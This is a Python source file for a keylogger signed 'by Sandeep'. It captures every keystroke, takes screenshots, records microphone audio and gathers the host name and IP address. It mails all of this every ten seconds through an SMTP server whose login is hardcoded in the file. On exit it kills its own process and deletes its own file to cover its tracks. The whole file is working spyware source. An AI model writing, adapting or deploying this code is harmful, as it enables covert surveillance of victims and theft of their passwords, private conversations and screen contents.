import logging
import os
import platform
import smtplib
import socket
import threading
import pyscreenshot
import sounddevice as sd
import numpy as np
import soundfile as sf
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
import subprocess

# Email configuration
EMAIL_ADDRESS = "128f1e9719da9b"
EMAIL_PASSWORD = "1f95ad1055c4e4"
SEND_REPORT_EVERY = 10  # as in seconds
AUDIO_SAMPLE_RATE = 44100  # Sample rate for audio recording
AUDIO_CHANNELS = 2  # Number of audio channels
AUDIO_FILENAME = "microphone_audio.wav"  # Change the filename to .wav
AUDIO_DURATION = 10  # Duration of each audio recording in seconds

# Create an empty audio file with the specified filename
open(AUDIO_FILENAME, 'w').close()

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        sender = "Private Person <from@example.com>"
        receiver = "A Test User <to@example.com>"

        m = f"""\
        Subject: Main Mailtrap
        To: {receiver}
        From: {sender}

        Keylogger by Sandeep\n"""

        m += message
        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(email, password)
            server.sendmail(sender, receiver, message)

    def record_audio(self):
        try:
            audio_data = sd.rec(int(AUDIO_DURATION * AUDIO_SAMPLE_RATE), samplerate=AUDIO_SAMPLE_RATE, channels=AUDIO_CHANNELS)
            sd.wait()  # Wait for the audio recording to complete

            # Save the microphone audio as a WAV file
            sf.write(AUDIO_FILENAME, audio_data, AUDIO_SAMPLE_RATE)

        except Exception as e:
            print(f"Error recording audio: {str(e)}")

    def send_audio_email(self):
        try:
            message = MIMEMultipart()
            message["From"] = self.email
            message["To"] = self.email
            message["Subject"] = "Microphone Audio Recording"

            # Attach the audio file with the correct audio MIME subtype (WAV)
            with open(AUDIO_FILENAME, "rb") as audio_file:
                audio_data = audio_file.read()
                audio_attachment = MIMEAudio(audio_data, _subtype="wav")
                audio_attachment.add_header("Content-Disposition", f"attachment; filename={AUDIO_FILENAME}")
                message.attach(audio_attachment)

            # Connect to Mailtrap's SMTP server and send the email
            smtp_server = smtplib.SMTP("smtp.mailtrap.io", 2525)
            smtp_server.starttls()
            smtp_server.login(self.email, self.password)
            smtp_server.sendmail(self.email, self.email, message.as_string())
            smtp_server.quit()

            # Delete the audio file after sending
            os.remove(AUDIO_FILENAME)

        except Exception as e:
            print(f"Error sending audio email: {str(e)}")

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        self.screenshot()
        self.record_audio()
        self.send_audio_email()
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()

        info = f"\nHostname: {hostname}\nIP Address: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n"
        self.appendlog(info)

    def screenshot(self):
        try:
            img = pyscreenshot.grab()
            img.save("screenshot.png")

            message = MIMEMultipart()
            message["From"] = self.email
            message["To"] = self.email
            message["Subject"] = "Screenshot"

            with open("screenshot.png", "rb") as img_file:
                img_data = img_file.read()
                image = MIMEImage(img_data)
                message.attach(image)

            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, message.as_string())

            os.remove("screenshot.png")

        except Exception as e:
            print(f"Error taking and sending screenshot: {str(e)}")

    def run(self):
        self.system_information()
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is closed.')
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " + os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf " + os.path.basename(__file__))
            except OSError:
                print('File is closed.')

if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
